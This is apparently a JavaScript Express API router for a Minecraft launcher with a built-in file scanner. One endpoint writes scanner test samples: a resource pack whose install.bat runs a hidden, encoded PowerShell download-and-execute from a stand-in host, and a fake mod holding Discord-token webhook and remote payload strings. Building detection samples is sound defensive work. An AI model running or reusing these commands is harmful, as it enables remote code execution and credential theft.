/**
 * Zeko Launcher — REST API
 */
import express from 'express';
import path from 'node:path';
import fs from 'node:fs/promises';
import crypto from 'node:crypto';
import { Paths, APP_NAME, APP_VERSION, APP_CODENAME, DataDir } from '../lib/paths.js';
import * as Instances from '../lib/instances.js';
import * as Settings from '../lib/settings.js';
import * as Catalog from '../lib/catalog.js';
import * as Performance from '../lib/performance.js';
import * as Java from '../lib/java.js';
import * as Metrics from '../lib/metrics.js';
import * as Downloads from '../lib/downloads.js';
import * as Quarantine from '../lib/quarantine.js';
import * as Sentinel from '../lib/scanner.js';
import * as Launch from '../lib/launcher.js';

const r = express.Router();
const wrap = (fn) => (req, res, next) => Promise.resolve(fn(req, res, next)).catch(next);
const fail = (msg, status = 400) => {
  const e = new Error(msg);
  e.status = status;
  return e;
};

/* ══════════════ 1. THÔNG TIN CHUNG ══════════════ */
r.get(
  '/meta',
  wrap(async (req, res) => {
    const settings = await Settings.load();
    const catalog = await Catalog.getCatalog();
    res.json({
      app: { name: APP_NAME, version: APP_VERSION, codename: APP_CODENAME, branch: 'aurora' },
      paths: { root: Paths.root, instances: Paths.instances, quarantine: Paths.quarantine, logs: Paths.logs },
      settings,
      catalog: { source: catalog.source, error: catalog.error, syncedAt: catalog.syncedAt, latest: catalog.latest, counts: catalog.counts },
      platform: process.platform,
      node: process.version,
    });
  })
);

/* ══════════════ 2. CÀI ĐẶT ══════════════ */
r.get('/settings', wrap(async (req, res) => res.json({ ok: true, settings: await Settings.load() })));
r.patch('/settings', wrap(async (req, res) => res.json({ ok: true, settings: await Settings.save(req.body || {}) })));
r.post('/settings/reset', wrap(async (req, res) => res.json({ ok: true, settings: await Settings.reset() })));

/* ══════════════ 3. PHIÊN BẢN ══════════════ */
r.get('/versions', wrap(async (req, res) => {
  const catalog = await Catalog.getCatalog({ force: req.query.refresh === '1' });
  const showSnapshots = req.query.snapshots === '1';
  const versions = catalog.versions.filter((v) => showSnapshots || v.type === 'release');
  res.json({ ok: true, ...catalog, versions });
}));

r.get('/versions/:id', wrap(async (req, res) => {
  const catalog = await Catalog.getCatalog();
  const meta = Catalog.findVersion(catalog, req.params.id);
  if (!meta) throw fail(`Không có phiên bản ${req.params.id}`, 404);
  let json = null;
  let error = null;
  try {
    json = await Catalog.fetchVersionJson(meta);
  } catch (err) {
    error = String(err?.message || err);
  }
  res.json({ ok: true, meta, versionJson: json, error, java: Java.requiredJava(meta.id) });
}));

/* ══════════════ 4. INSTANCES ══════════════ */
r.get('/instances', wrap(async (req, res) => res.json({ ok: true, instances: await Instances.listInstances() })));

r.post(
  '/instances',
  wrap(async (req, res) => {
    const b = req.body || {};
    if (!b.version) throw fail('Thiếu phiên bản game');
    const inst = await Instances.createInstance(b);
    if (b.perfProfile) {
      const preset = await Performance.getPreset(b.perfProfile);
      await Launch.applyGameSettings(inst, preset.gameSettings);
    }
    res.status(201).json({ ok: true, instance: inst });
  })
);

r.get('/instances/:id', wrap(async (req, res) => {
  const raw = await Instances.getInstance(req.params.id);
  if (!raw) throw fail('Không tìm thấy instance', 404);
  const inst = await Instances.withStats(raw);
  const dir = path.join(Paths.instances, inst.slug);
  const [mods, packs, shaders, saves] = await Promise.all([
    Instances.listInstanceFiles(req.params.id, 'mods'),
    Instances.listInstanceFiles(req.params.id, 'resourcepacks'),
    Instances.listInstanceFiles(req.params.id, 'shaderpacks'),
    Instances.listInstanceFiles(req.params.id, 'saves'),
  ]);
  const session = Launch.getSession(req.params.id);
  let lastScan = null;
  try {
    lastScan = JSON.parse(await fs.readFile(path.join(dir, '.zeko', 'last-scan.json'), 'utf8'));
  } catch { /* chưa quét */ }
  res.json({ ok: true, instance: await enrich(inst), files: { mods, packs, shaders, saves }, running: session ? { state: session.state, pid: session.proc?.pid } : null, lastScan });
}));

r.patch('/instances/:id', wrap(async (req, res) => {
  const inst = await Instances.updateInstance(req.params.id, req.body || {});
  const preset = await Performance.getPreset(inst.perfProfile);
  await Launch.applyGameSettings(inst, preset.gameSettings);
  res.json({ ok: true, instance: inst });
}));

r.delete('/instances/:id', wrap(async (req, res) => res.json({ ok: true, ...(await Instances.deleteInstance(req.params.id, { keepBackups: req.query.keep === '1' })) })));
r.post('/instances/:id/duplicate', wrap(async (req, res) => res.status(201).json({ ok: true, instance: await Instances.duplicateInstance(req.params.id, req.body?.name) })));

r.get('/instances/:id/files', wrap(async (req, res) => res.json({ ok: true, files: await Instances.listInstanceFiles(req.params.id, req.query.dir || '.') })));

/** Sinh tệp .mcfunction/.txt mẫu để thử nghiệm Sentinel (không phải mã độc thật). */
r.post('/instances/:id/files/sample', wrap(async (req, res) => {
  const kind = req.body?.kind || 'trap-pack';
  const dir = await Instances.instanceDir(req.params.id);
  const samples = {
    'trap-pack': {
      rel: 'resourcepacks/DarkSamplePack.zip',
      build: async (dest) => {
        await fs.mkdir(path.dirname(dest), { recursive: true });
        const { buildZip } = await import('../lib/zipwrite.js');
        await buildZip(dest, [
          { name: 'pack.mcmeta', data: '{"pack":{"pack_format":15,"description":"Sample"}}' },
          { name: 'install.bat', data: '@echo off\r\npowershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGUAeABhAG0AcABsAGUvAHgAJwApAA==\r\n' },
          { name: 'assets/minecraft/lang/vi_vn.json', data: '{"sample":"Zeko test file — NOT real malware"}' },
        ]);
      },
    },
    'clean-pack': {
      rel: 'resourcepacks/CleanSamplePack.zip',
      build: async (dest) => {
        await fs.mkdir(path.dirname(dest), { recursive: true });
        const { buildZip } = await import('../lib/zipwrite.js');
        await buildZip(dest, [
          { name: 'pack.mcmeta', data: '{"pack":{"pack_format":15,"description":"Clean sample"}}' },
          { name: 'pack.png', data: Buffer.from('89504e470d0a1a0a', 'hex') },
          { name: 'assets/minecraft/lang/vi_vn.json', data: '{"block.minecraft.stone":"Đá"}' },
        ]);
      },
    },
    'sus-mod': {
      rel: 'mods/freecoins-mod.jar',
      build: async (dest) => {
        await fs.mkdir(path.dirname(dest), { recursive: true });
        const { buildZip } = await import('../lib/zipwrite.js');
        await buildZip(dest, [
          { name: 'a/b/Cd.class', data: 'cafebabe' + 'MZ\u0090\u0000' + 'discord_tokens webhook https://discord.com/api/webhooks/123/abc' },
          { name: 'x/y/Ef.class', data: 'cafebabe' + 'URLClassLoader defineClass ProcessBuilder http://185.220.101.44/payload' },
          ...Array.from({ length: 60 }, (_, i) => ({ name: `z/q/Q${i}.class`, data: 'cafebabe' + 'x'.repeat(200) })),
        ]);
      },
    },
  };
  const s = samples[kind];
  if (!s) throw fail(`Mẫu không hợp lệ. Chọn: ${Object.keys(samples).join(', ')}`);
  const dest = path.join(dir, s.rel);
  await s.build(dest);
  res.status(201).json({ ok: true, created: s.rel, note: 'Tệp mẫu để kiểm thử bộ quét — không phải mã độc thật.' });
}));

const enrich = Instances.withStats;

/* ══════════════ 5. HIỆU NĂNG (ZEKO TURBO) ══════════════ */
r.get('/performance/presets', wrap(async (req, res) => {
  const p = await Performance.getPresets();
  res.json({ ok: true, presets: p.presets, shaders: p.shaders, modCatalog: p.modCatalog });
}));

r.get('/performance/recommend', wrap(async (req, res) => {
  const rec = await Performance.recommend();
  const mods = await Performance.modsForProfile(rec.preset.id);
  res.json({ ok: true, ...rec, mods, advice: Metrics.autoTuneAdvice() });
}));

r.get('/performance/mods', wrap(async (req, res) => {
  const p = await Performance.getPresets();
  res.json({ ok: true, mods: Object.entries(p.modCatalog).map(([key, v]) => ({ key, ...v })) });
}));

r.post('/performance/apply/:instanceId', wrap(async (req, res) => {
  const id = req.params.instanceId;
  const inst = await Instances.getInstance(id);
  if (!inst) throw fail('Không tìm thấy instance', 404);
  const presetId = req.body?.preset || inst.perfProfile || 'lowend';
  const preset = await Performance.getPreset(presetId);
  const applied = await Launch.applyGameSettings(inst, preset.gameSettings);
  const updated = await Instances.updateInstance(id, { perfProfile: presetId, ram: { minMb: preset.minRamMb, maxMb: preset.maxRamMb } });
  res.json({ ok: true, preset: presetId, applied, instance: updated });
}));

/* ══════════════ 6. ĐIỂM CHUẨN & SỐ LIỆU MÁY ══════════════ */
r.get('/system', wrap(async (req, res) => res.json({ ok: true, ...(await Metrics.systemSnapshot()), disk: await Metrics.diskInfo(), advice: Metrics.autoTuneAdvice() })));
r.post('/system/benchmark', wrap(async (req, res) => res.json({ ok: true, benchmark: await Metrics.quickBenchmark({ workDir: Paths.cache }) })));
r.get('/system/java', wrap(async (req, res) => res.json({ ok: true, ...(await Java.javaStatus()) })));

/* ══════════════ 7. ZEKO SENTINEL (AN TOÀN TỆP) ══════════════ */
const scanJobs = new Map();

r.get('/security/status', wrap(async (req, res) => {
  const q = await Quarantine.quarantineStats();
  const settings = await Settings.load();
  const instances = await Instances.listInstances();
  const scanned = [];
  for (const inst of instances) {
    try {
      const last = JSON.parse(await fs.readFile(path.join(Paths.instances, inst.slug, '.zeko', 'last-scan.json'), 'utf8'));
      scanned.push({ id: inst.id, slug: inst.slug, name: inst.name, riskScore: last.riskScore, scannedAt: last.scannedAt, threats: last.counts?.threats ?? 0 });
    } catch {
      scanned.push({ id: inst.id, slug: inst.slug, name: inst.name, riskScore: null, scannedAt: null, threats: 0 });
    }
  }
  res.json({ ok: true, quarantine: q, settings: settings.security, instances: scanned, rulesVersion: (await rulesVersion()) });
}));

r.get('/security/rules', wrap(async (req, res) => {
  const raw = JSON.parse(await fs.readFile(path.join(DataDir, 'scanner-rules.json'), 'utf8'));
  res.json({ ok: true, ...raw, signatures: raw.signatures.map(({ pattern, ...s }) => ({ ...s, pattern: pattern.slice(0, 90) })) });
}));

async function rulesVersion() {
  try {
    const raw = JSON.parse(await fs.readFile(path.join(DataDir, 'scanner-rules.json'), 'utf8'));
    return raw.version;
  } catch {
    return null;
  }
}

r.post('/security/scan', wrap(async (req, res) => {
  const instanceId = req.body?.instanceId;
  if (!instanceId) throw fail('Thiếu instanceId');
  const inst = await Instances.getInstance(instanceId);
  if (!inst) throw fail('Không tìm thấy instance', 404);
  const jobId = crypto.randomBytes(4).toString('hex');
  const dir = path.join(Paths.instances, inst.slug);
  const job = { id: jobId, instanceId, state: 'running', startedAt: Date.now(), progress: 0, current: null };
  scanJobs.set(jobId, job);
  res.status(202).json({ ok: true, jobId, instanceId });

  const total = await countFiles(dir);
  let done = 0;
  const report = await Sentinel.scanDirectory(dir, {
    maxFiles: 6000,
    onProgress: ({ current }) => {
      done++;
      job.progress = total ? Math.round((done / total) * 100) : 0;
      job.current = current;
    },
  });
  job.state = 'done';
  job.progress = 100;
  job.report = { ...report, results: report.results.slice(0, 300), all: undefined };

  // tự cách ly tệp rủi ro cao nếu người dùng bật
  const settings = await Settings.load();
  const threats = report.results.filter((x) => x.verdict === 'threat').map((x) => x.file);
  if (threats.length && req.body?.autoQuarantine !== false) {
    job.quarantine = await Quarantine.quarantineFiles(dir, threats, { report, reason: 'Quét tự động bởi Zeko Sentinel' });
    job.report.counts.quarantined = job.quarantine.counts.moved;
  }

  try {
    await fs.mkdir(path.join(dir, '.zeko'), { recursive: true });
    await fs.writeFile(path.join(dir, '.zeko', 'last-scan.json'), JSON.stringify({ ...report, all: undefined }, null, 2));
  } catch { /* bỏ qua */ }
}));

async function countFiles(dir) {
  let n = 0;
  const stack = [dir];
  while (stack.length && n < 20000) {
    const cur = stack.pop();
    let entries = [];
    try { entries = await fs.readdir(cur, { withFileTypes: true }); } catch { continue; }
    for (const e of entries) {
      if (e.isDirectory()) stack.push(path.join(cur, e.name));
      else n++;
    }
  }
  return n;
}

r.get('/security/scan/:jobId', wrap(async (req, res) => {
  const job = scanJobs.get(req.params.jobId);
  if (!job) throw fail('Không tìm thấy tiến trình quét', 404);
  res.json({ ok: true, ...job });
}));

/** Quét nhanh 1 tệp (kéo-thả vào UI). */
r.post('/security/scan-file', wrap(async (req, res) => {
  const target = req.body?.path;
  if (!target) throw fail('Thiếu đường dẫn tệp');
  const abs = path.resolve(target);
  if (!abs.startsWith(path.resolve(Paths.instances)) && !abs.startsWith(path.resolve(Paths.quarantine))) {
    throw fail('Zeko chỉ quét tệp nằm trong thư mục instance hoặc vùng cách ly.', 403);
  }
  res.json({ ok: true, finding: await Sentinel.scanFile(abs) });
}));

/** VERIFY — chụp "ảnh gốc" SHA-1 của instance để phát hiện thay đổi về sau. */
r.post('/security/verify', wrap(async (req, res) => {
  const inst = await Instances.getInstance(req.body?.instanceId);
  if (!inst) throw fail('Không tìm thấy instance', 404);
  const dir = path.join(Paths.instances, inst.slug);
  const manifestFile = path.join(dir, '.zeko', 'manifest.sha1.json');
  if (req.body?.mode === 'build') {
    const manifest = await Sentinel.buildManifest(dir);
    await fs.mkdir(path.dirname(manifestFile), { recursive: true });
    await fs.writeFile(manifestFile, JSON.stringify({ builtAt: new Date().toISOString(), files: manifest }, null, 2));
    return res.json({ ok: true, mode: 'built', files: manifest.length });
  }
  let stored;
  try {
    stored = JSON.parse(await fs.readFile(manifestFile, 'utf8'));
  } catch {
    throw fail('Chưa có ảnh gốc SHA-1. Hãy bấm "Chụp ảnh gốc" trước.', 409);
  }
  const result = await Sentinel.verifyAgainstManifest(dir, stored.files);
  res.json({ ok: true, mode: 'checked', builtAt: stored.builtAt, ...result, tampered: result.bad.length > 0 });
}));

r.get('/security/quarantine', wrap(async (req, res) => {
  const list = await Quarantine.listQuarantine();
  const details = [];
  for (const row of list.slice(0, 25)) details.push(await Quarantine.getBatch(row.batch));
  res.json({ ok: true, list, details: details.filter(Boolean) });
}));

r.post('/security/quarantine/:batch/restore', wrap(async (req, res) => res.json({ ok: true, ...(await Quarantine.restoreBatch(req.params.batch)) })));
r.delete('/security/quarantine/:batch', wrap(async (req, res) => res.json({ ok: true, ...(await Quarantine.purgeBatch(req.params.batch)) })));

/* ══════════════ 8. TẢI GAME ══════════════ */
r.post('/download', wrap(async (req, res) => {
  const instanceId = req.body?.instanceId;
  const inst = await Instances.getInstance(instanceId);
  if (!inst) throw fail('Không tìm thấy instance', 404);
  const catalog = await Catalog.getCatalog();
  const meta = Catalog.findVersion(catalog, inst.version);
  if (!meta) throw fail(`Không có phiên bản ${inst.version} trong danh mục`);

  let versionJson;
  try {
    versionJson = await Catalog.fetchVersionJson(meta);
  } catch (err) {
    throw Object.assign(fail(`Không tải được metadata phiên bản (cần mạng tới piston-meta.mojang.com): ${err.message}`, 502), { code: 'ZEKO_NO_NETWORK' });
  }

  const jobs = await Downloads.prepareVersion(versionJson, { librariesDir: Paths.libraries, assetsDir: Paths.assets });
  res.status(202).json({ ok: true, queued: jobs.length, note: 'Theo dõi tiến độ qua kênh /api/stream (sự kiện "download").' });
  Downloads.downloadAll(jobs).then((results) => {
    const failed = results.filter((x) => !x.ok);
    console.log(`[zeko] tải xong ${results.length - failed.length}/${results.length} tệp cho ${inst.version}`);
  });
}));

/* ══════════════ 9. KHỞI ĐỘNG GAME ══════════════ */
r.post('/launch/:instanceId', wrap(async (req, res) => {
  const inst = await Instances.getInstance(req.params.instanceId);
  if (!inst) throw fail('Không tìm thấy instance', 404);
  const settings = await Settings.load();
  if (req.body?.profile) await Instances.updateInstance(inst.id, { perfProfile: req.body.profile });
  const catalog = await Catalog.getCatalog();
  const meta = Catalog.findVersion(catalog, inst.version);
  let versionJson = null;
  const cachedJson = path.join(Paths.versions, inst.version, `${inst.version}.json`);
  try {
    versionJson = JSON.parse(await fs.readFile(cachedJson, 'utf8'));
  } catch {
    try {
      if (meta) versionJson = await Catalog.fetchVersionJson(meta);
      if (versionJson) {
        await fs.mkdir(path.dirname(cachedJson), { recursive: true });
        await fs.writeFile(cachedJson, JSON.stringify(versionJson, null, 2));
      }
    } catch { /* offline: dùng lệnh dựng sẵn tối thiểu */ }
  }
  const result = await Launch.launch({ instance: inst, settings, versionJson, profileId: req.body?.profile });
  res.json({ ok: true, ...result });
}));

r.post('/stop/:instanceId', wrap(async (req, res) => {
  const stopped = Launch.stopGame(req.params.instanceId);
  res.json({ ok: true, stopped });
}));

r.get('/sessions', wrap(async (req, res) => res.json({ ok: true, sessions: Launch.activeSessions() })));

r.get('/console/:instanceId', wrap(async (req, res) => {
  const s = Launch.getSession(req.params.instanceId);
  if (!s) return res.json({ ok: true, lines: [], running: false });
  res.json({ ok: true, running: s.state !== 'exited', state: s.state, pid: s.proc?.pid, fpsHint: s.fpsHint, lines: s.log.slice(-1500) });
}));

/** Đọc log mới nhất của game (latest.log / logs trong instance). */
r.get('/instances/:id/logs', wrap(async (req, res) => {
  const dir = await Instances.instanceDir(req.params.id);
  const candidates = [path.join(dir, 'logs', 'latest.log'), path.join(dir, 'logs', 'debug.log')];
  for (const f of candidates) {
    try {
      const text = await fs.readFile(f, 'utf8');
      const tail = text.split(/\r?\n/).slice(-800);
      const fps = tail.filter((l) => /FPS|fps/i.test(l)).slice(-40);
      return res.json({ ok: true, file: path.basename(f), lines: tail, fpsLines: fps });
    } catch { /* thử tệp kế */ }
  }
  res.json({ ok: true, file: null, lines: [], fpsLines: [] });
}));

/* ══════════════ 10. TIN TỨC / LIÊN KẾT ══════════════ */
r.get('/news', wrap(async (req, res) => {
  res.json({
    ok: true,
    source: 'static',
    items: [
      { title: 'Zeko Launcher 1.0 "Aurora" ra mắt', kind: 'release', date: '2026-09-08', text: 'Giao diện mới hoàn toàn, Zeko Turbo cho máy yếu và Zeko Sentinel quét tệp game.', href: '#/changelog' },
      { title: 'Sodium 0.6 — tăng FPS mạnh hơn', kind: 'mod', date: '2026-08-20', text: 'Bản cập nhật engine kết xuất: giảm tải CPU khi render chunk xa.', href: 'https://modrinth.com/mod/sodium' },
      { title: 'Cảnh báo: mod độc hại giả dạng "FPS Boost"', kind: 'security', date: '2026-07-30', text: 'Zeko Sentinel đã bổ sung chữ ký cho họ mã độc này. Hãy quét thư mục mods sau khi tải mod từ nguồn lạ.', href: '#/security' },
      { title: 'Java 21 bắt buộc cho Minecraft 1.20.5+', kind: 'tips', date: '2026-06-11', text: 'Kiểm tra tab Hiệu năng → Java để biết máy bạn còn thiếu bản nào.', href: 'https://adoptium.net/' },
    ],
  });
}));

export default r;
